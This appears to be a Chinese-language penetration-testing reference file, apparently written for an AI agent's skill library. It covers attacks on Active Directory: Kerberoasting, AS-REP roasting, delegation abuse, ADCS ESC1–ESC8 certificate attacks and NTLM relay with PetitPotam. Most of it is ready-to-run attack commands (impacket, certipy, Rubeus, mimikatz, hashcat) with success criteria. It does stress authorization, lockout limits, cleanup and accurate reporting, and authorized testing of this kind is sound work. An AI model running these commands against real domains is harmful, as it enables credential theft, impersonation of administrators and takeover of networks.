# Kerberos 与 ADCS（kerberos-and-adcs）

> 配套 `ad-cloud/SKILL.md`、`references/ad-attacks.md`。命令只在**明确授权**的域/账号/主机上执行。
> 占位符：`<domain>`、`<DC_IP>`、`<user>`、`<pass>`、`<target>`、`<CA>`、`<Tpl>`。先同步时间（±5 分钟），再确认账号锁定阈值。

## 0. 前置与降噪

```bash
export DOMAIN='corp.local' DC='10.0.0.10' USER='alice' PASS='P@ssw0rd'
sudo chronyc makestep 2>/dev/null || sudo ntpdate -u "$DC"
nxc smb "$DC" --pass-pol -u '' -p ''        # 先看锁定阈值/密码策略
```

- 同一账号认证失败 2 次即停；不要拿锁定阈值“试试看”。
- Kerberoast/AS-REP 会进 4769/4768；控频，优先单账号/单 SPN。
- 票据/证书只留指纹、有效期、用途，不回传明文。

## 1. Kerberoasting（TGS）

```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC"          # 枚举，不请求票据
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request-user '<svc>' -outputfile evidence/kerb/kerb.hashes      # 降噪：单 SPN
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request -outputfile evidence/kerb/kerb-all.hashes               # 全量，仅必要时
hashcat -m 13100 evidence/kerb/kerb.hashes wordlist.txt   # RC4 TGS-REP
hashcat -m 19700 evidence/kerb/kerb.hashes wordlist.txt   # AES128
hashcat -m 19800 evidence/kerb/kerb.hashes wordlist.txt   # AES256
```

判据：拿到可离线破解的 TGS **且**破解出明文，或该 hash 直接完成下一步（PtH/伪造需匹配 etype）。
仅 hash 未破解 = 素材，不能写成“拿到域账号”；失败面（时钟/锁定/仅 AES）见 §7。

## 2. AS-REP Roasting（无预认证）

```bash
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
  -format hashcat -outputfile evidence/kerb/asrep.hashes
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -request-user '<user>' \
  -no-pass -format hashcat -outputfile evidence/kerb/asrep-one.hash
hashcat -m 18200 evidence/kerb/asrep.hashes wordlist.txt   # RC4 AS-REP
hashcat -m 19900 evidence/kerb/asrep.hashes wordlist.txt   # AES256
```

判据：破解出明文，或可直接用于预认证/离线复用。
失败判据：账号已启预认证、被锁定、或仅 AES 而字典不匹配。

## 3. 委派

### 3.1 枚举

```bash
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# Windows/PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname,samaccountname
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity
```

### 3.2 Unconstrained

前提：控制一台 Unconstrained 主机，并让高权账号/主机认证到它。

```bash
Rubeus.exe monitor /interval:5 /nowrap     # Windows 受控主机
sekurlsa::tickets /export                  # 或从内存导出票据
```

判据：捕获高价值账号 TGT，导入后可访问目标服务。
失败判据：只有机器账号 TGT、目标未发起认证、票据已过期。

### 3.3 Constrained（S4U2Self + S4U2Proxy）

```bash
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"
```

判据：以目标身份拿到服务票据，`whoami` 返回预期账号。
失败判据：SPN 不匹配、`msDS-AllowedToDelegateTo` 未含目标、服务拒绝协议转换。

### 3.4 RBCD

前提：对目标计算机对象有写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 的权限。

```bash
impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -computer-name 'EVIL$' -computer-pass 'P@ss1234'
impacket-rbcd -action write -delegate-to '<target>$' -delegate-from 'EVIL$' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/EVIL$:P@ss1234" -dc-ip "$DC"
```

判据：S4U2Proxy 成功拿到目标票据，并能远程执行。
失败判据：无写权限、目标已有 RBCD 冲突、目标禁用协议转换。

## 4. ADCS 枚举

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output evidence/adcs/find
```

记录：CA 名/主机、模板名、`Enroll` 权限、Client Auth / Any Purpose EKU、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`、manager approval、`Authorized Signatures`、`EDITF_ATTRIBUTESUBJECTALTNAME2`、HTTP 注册端点。
`certipy find` 报 vulnerable **不等于**可利用：须确认当前账号能注册、模板允许目标用法、无审批。

## 5. ESC1-8：条件 → 命令 → 判据

| ESC | 条件（缺一不可） | 判据 |
|---|---|---|
| ESC1 | Enrollee Supplies Subject + Client Auth EKU + 当前账号 `Enroll` + 无审批 | `certipy auth` 返回 administrator TGT/hash 且能访问目标 |
| ESC2 | EKU 为 Any Purpose 或空，低权可注册 | 证书被目标服务接受并完成认证/代签 |
| ESC3 | 可注册 `Certificate Request Agent`，目标模板允许代理注册 | 代签出目标用户证书且 `auth` 得目标 TGT/hash |
| ESC4 | 对模板对象有 `WriteDACL`/`WriteOwner`/`GenericAll` | 改模板后发证成功、`auth` 成功（测后恢复） |
| ESC5 | 对 CA 对象/模板容器/`NTAuthCertificates` 有写权限 | 取得控制后能完成 ESC7/ESC4 的实际利用 |
| ESC6 | CA 开了 `EDITF_ATTRIBUTESUBJECTALTNAME2` | 非 ESC1 模板也签发目标 SAN 并认证成功 |
| ESC7 | CA 上有 `ManageCA` 或 `ManageCertificates` | 批准并检索到目标证书，`auth` 验证通过 |
| ESC8 | CA 暴露 `/certsrv/` + 目标可强制认证 + 未启 EPA/签名 | relay 拿到证书，`certipy auth -pfx` 得目标 TGT/hash |

申请 + 认证（ESC1/2/4/6 共用；ESC4 先备份再改）：

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
# ESC4：-save-old 备份，-write-default-configuration 改成可利用配置
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -template '<Tpl>' -save-old
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -template '<Tpl>' -write-default-configuration
```

ESC3 代理代签、ESC5 读写 PKI 对象 ACL、ESC7 审批、ESC8 relay（触发需单独授权）：

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template 'ESC3-CRA'
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' \
  -on-behalf-of "$DOMAIN\\administrator" -pfx agent.pfx
dacledit.py -action read -target 'CN=<CA>,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
dacledit.py -action write -rights FullControl -principal "$USER" \
  -target 'CN=<CA>,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -add-officer "$USER"
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -issue-request <id>
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -retrieve <id>
certipy relay -ca '<CA>' -template 'DomainController'
impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support \
  --adcs --template 'DomainController'
petitpotam.py <listener_ip> <target_ip>
```

## 6. NTLM relay 通用前提

```bash
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
```

- SMB→SMB 需目标未强制 signing；LDAP relay 需 LDAP signing 未强制；ADCS HTTP 需 EPA 未开。
- 判据：建立可用会话或拿到证书；仅收到入站认证请求不算。`relay_targets.txt` 只放授权目标。

## 7. 失败判据与处理（ESC/委派/relay 共用）

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 | 同步后重试一次 |
| `STATUS_ACCOUNT_LOCKED_OUT` | 触发锁定 | 立即停，换账号/来源并报告 |
| Kerberoast 无 RC4 | 账号仅 AES/策略 | 改 AES 模式或放弃该账号 |
| `certipy req` 拒绝 | 无 Enroll/需审批/无 SAN | 查模板 ACL、EKU、manager approval |
| `certipy auth` 失败 | 用途/CA 链/账号状态 | 查 EKU、`NTAuthCertificates`、撤销 |
| ESC5 写不进 | ACL 只读/SACL 保护 | 停手，转 ESC1/ESC6 等可注册面 |
| getST 失败 | SPN/委派属性错 | 核对 `msDS-AllowedToDelegateTo`/RBCD |
| relay 无会话 | signing/EPA | 换目标或改打 ADCS HTTP |

## 8. 证据与清理

- 路径：源主体 → 动作 → 目标主体 → 结果，附命令、时间、返回码。
- 凭据：类型、来源、有效期、SHA256 前 8 位；不回传明文。提权前后留 `whoami /all`、`certipy auth`、`klist`。
- 清理：删临时计算机账号、证书请求、上传工具、计划任务；恢复被改模板/ACL（有备份时）。
- 报告区分“配置缺陷”“拿到证书”“拿到 TGT”“成功横向”，不把前者写成后者。

## 9. 边界

- 只在授权域/账号/主机上操作；不碰授权外 DC、CA、生产业务。
- 不做未授权持久化、后门、批量喷洒、DoS；不伪造/篡改日志。
- 纯 Web 漏洞走 R20；云/K8s 见 `k8s-and-container.md`、`cloud-native.md`。

更长的清单见同目录其它篇。
